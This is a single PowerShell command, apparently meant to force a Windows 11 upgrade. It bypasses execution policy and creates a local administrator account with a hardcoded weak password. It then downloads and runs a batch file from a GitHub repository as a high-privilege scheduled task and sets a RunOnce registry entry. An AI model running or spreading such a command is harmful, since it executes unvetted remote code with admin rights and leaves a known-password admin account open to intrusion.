powershell -ExecutionPolicy Bypass -NoProfile -Command "$user='WinUpgTemp';$pass='TempPass123!';$root='C:\Win11Upgrade';$repo='https://codeload.github.com/sctcoder1/project-711-d/zip/refs/heads/main';$zip=Join-Path $root 'project-711-d.zip';$extract=Join-Path $root 'project-711-d-main';$bat=Join-Path $extract 'Win11_Upgrade.bat';$cleanup=Join-Path $root 'Cleanup_Win11Upgrade.bat';$log=Join-Path $root 'Setup_Log.txt';function log($m){$t='['+(Get-Date -Format \"yyyy-MM-dd HH:mm:ss\")+'] '+$m;New-Item -ItemType Directory -Force -Path (Split-Path $log)|Out-Null;Add-Content -Path $log -Value $t;Write-Host $t};log '--- Starting full Win11 upgrade process with temp admin ---';if(-not(Test-Path $root)){New-Item -ItemType Directory -Force -Path $root|Out-Null};try{if(-not(Get-LocalUser -Name $user -ErrorAction SilentlyContinue)){net user $user $pass /add | Out-Null;net localgroup administrators $user /add | Out-Null;log ('Created admin user '+$user)}else{log ('Admin user '+$user+' already exists')}}catch{};log 'Downloading and extracting repo...';Invoke-WebRequest -Uri $repo -OutFile $zip -UseBasicParsing;Expand-Archive -Path $zip -DestinationPath $root -Force;Remove-Item $zip -Force;Rename-Item -Path (Join-Path $root 'project-711-d-main') -NewName 'project-711-d' -ErrorAction SilentlyContinue;Start-Sleep -Seconds 5;$bat=Join-Path $root 'project-711-d\Win11_Upgrade.bat';if(Test-Path $bat){schtasks /delete /tn Win11Upgrade /f 2>$null;log 'Creating task to run upgrade under '+$user; $tr='cmd /c \"'+$bat+'\"';$out=schtasks /create /tn Win11Upgrade /tr $tr /sc once /st 23:59 /RL HIGHEST /RU $user /RP $pass /F 2>&1;log ('schtasks /create output: '+$out);if($LASTEXITCODE -eq 0){log 'Running upgrade task now...';$out2=schtasks /run /tn Win11Upgrade 2>&1;log ('schtasks /run output: '+$out2);Start-Sleep -Seconds 15;log 'Upgrade task started successfully under '+$user;}else{log ('ERROR: Task creation failed code '+$LASTEXITCODE)}}else{log ('ERROR: Missing file '+$bat)};if(Test-Path $cleanup){log 'Registering cleanup batch for post-reboot...';New-Item -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce' -Force | Out-Null;Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce' -Name 'Win11Cleanup' -Value ('cmd /c \"'+$cleanup+'\"');log 'Cleanup registered.'}else{log ('WARNING: Cleanup file not found ('+$cleanup+'), skipping schedule.')} ;log '--- Script complete ---'"
